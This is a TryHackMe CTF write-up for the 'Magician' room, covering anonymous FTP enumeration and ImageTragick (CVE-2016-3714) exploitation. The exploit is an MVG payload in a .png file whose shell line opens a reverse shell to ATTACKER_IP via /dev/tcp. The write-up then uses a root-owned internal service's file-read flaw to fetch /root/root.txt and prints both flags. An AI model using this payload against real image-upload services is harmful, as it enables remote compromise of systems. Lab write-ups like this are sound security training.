# Magician — TryHackMe Writeup

**Room:** [Magician](https://tryhackme.com/room/magician)  
**Difficulty:** Medium  
**OS:** Linux  
**Tags:** ImageTragick, CVE-2016-3714, SSRF, LFI, Binary Decoding

---

## Overview

This room features a magical image conversion website. The attack chain involves discovering an ImageTragick (CVE-2016-3714) vulnerability in the PNG-to-JPG converter backend, exploiting it for a reverse shell, and then leveraging an internal Flask service running as root to read the root flag.

---

## Reconnaissance

### Nmap Scan

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy (Spring Boot JSON API)
8081/tcp open  http       nginx 1.14.0 (Ubuntu) — title: "magician"
```

Three services are exposed: FTP, a Spring Boot backend on 8080, and an nginx frontend on 8081.

### Host Configuration

As instructed by the room description, the target IP was added to `/etc/hosts`:

```
10.67.191.130  magician  magician.thm
```

### Web Enumeration (Gobuster on port 8080)

```
/files   (Status: 200) — directory listing of converted images
/upload  (Status: 405) — file upload endpoint (POST only)
/error   (Status: 500) — Spring Boot error page
```

### Frontend Analysis (port 8081)

The frontend is a Vue.js application. Examining the bundled JavaScript (`app.2af72f5c.js`) revealed:

- The app is a **PNG to JPG converter**
- Client-side filter: `accept: "image/png"` (easily bypassed)
- Upload endpoint: `POST http://magician:8080/upload` with `multipart/form-data`
- Converted files served via: `GET http://magician:8080/files`

---

## FTP Enumeration

Connecting to FTP with anonymous credentials initially appeared to hang. Waiting patiently revealed it was configured with `delay_successful_login` in `/etc/vsftpd.conf`:

```bash
ftp magician.thm
# Login: anonymous
# Password: (empty)
```

After the delay, the banner disclosed a critical hint:

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya,
it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;)
Since you're a rookie, this might help you to get started: https://imagetragick.com.
You might need to do some little tweaks though...
```

**Key takeaway:** The conversion backend uses **ImageMagick** and is vulnerable to **ImageTragick (CVE-2016-3714)**.

---

## Exploitation — ImageTragick (CVE-2016-3714)

### Vulnerability Background

ImageTragick is a critical vulnerability in ImageMagick that allows Remote Code Execution through specially crafted image files. When ImageMagick processes an MVG (Magick Vector Graphics) file containing the `image` directive with a pipe (`|`) character, it executes the following string as a shell command instead of treating it as a filename.

### Crafting the Payload

The working payload uses the MVG `image Over` directive with a pipe to execute a reverse shell:

```bash
cat > exploit.png << 'EOF'
push graphic-context
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/ATTACKER_IP/1234 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```

> **Note:** The file uses `.png` extension but contains MVG content. ImageMagick identifies file format by content (magic bytes/structure), not by extension. The "little tweaks" mentioned in the FTP hint refer to the specific reverse shell redirection syntax: `> /dev/tcp/IP/PORT 0<&1 2>&1` instead of the more common `>& /dev/tcp/IP/PORT 0>&1`.

### Executing the Exploit

Start a netcat listener:

```bash
nc -lvnp 1234
```

Upload the payload directly to the backend (bypassing the client-side PNG filter):

```bash
curl -X POST http://magician.thm:8080/upload -F "file=@exploit.png"
```

A reverse shell connects back as user `magician`:

```
Connection received on 10.67.191.130 50194
magician@magician:/tmp/hsperfdata_magician$ id
uid=1000(magician) gid=1000(magician) groups=1000(magician)
```

### User Flag

```bash
cat /home/magician/user.txt
# THM{simsalabim_hex_hex}
```

---

## Privilege Escalation — Internal Service LFI

### Internal Enumeration

Checking running processes and listening ports revealed an internal service:

```bash
netstat -tulnp
# tcp  0  0  127.0.0.1:6666  0.0.0.0:*  LISTEN

ps aux | grep gunicorn
# root  997  /usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
```

A Flask application called **magiccat** is running as **root** on `localhost:6666`.

### The Hint

```bash
cat /home/magician/the_magic_continues
```

```
The magician is known to keep a locally listening cat up his sleeve,
it is said to be an oracle who will tell you secrets if you are good
enough to understand its meows.
```

### Exploiting the Internal Service

Querying the service revealed a form with a `filename` input field — a classic **Local File Inclusion** vector. Since gunicorn runs as root, it can read any file on the system:

```bash
curl -X POST http://127.0.0.1:6666/ -d "filename=/root/root.txt&submit=Submit"
```

The response contained the root flag encoded in **binary (base-2 ASCII)**:

```
1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011
1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101
1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110
1011111 1101101 1100001 1100100 1111101
```

### Decoding the Root Flag

```bash
python3 -c "
binary = '1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011 1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101 1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110 1011111 1101101 1100001 1100100 1111101'
bits = binary.split()
print(''.join(chr(int(b, 2)) for b in bits))
"
```

### Root Flag

```
THM{magic_may_make_many_men_mad}
```

---

## Attack Chain Summary

```
FTP Anonymous (delayed login)
  └─> Hint: imagetragick.com
        └─> CVE-2016-3714: MVG payload via image Over '|command'
              └─> Reverse shell as magician
                    └─> user.txt: THM{simsalabim_hex_hex}
                    └─> Internal Flask service on localhost:6666 (root)
                          └─> LFI: read /root/root.txt
                                └─> Binary decode
                                      └─> root.txt: THM{magic_may_make_many_men_mad}
```

---

## Lessons Learned

1. **Patience matters.** The FTP server used `delay_successful_login` to slow down anonymous access. Abandoning the connection too early means missing a critical hint.

2. **Know your payloads.** ImageTragick has multiple exploit vectors (`fill url()`, `image Over`, `ephemeral:`, `msl:`). When dealing with a known CVE, systematically test all documented PoCs rather than fixating on a single variant.

3. **Always enumerate internal services.** After gaining a shell, `netstat -tulnp` and `ps aux` revealed a root-owned Flask app invisible from the outside — the direct path to privilege escalation.

4. **Client-side validation is not security.** The Vue.js frontend restricted uploads to PNG files, but sending requests directly to the backend API with `curl` bypassed this entirely.
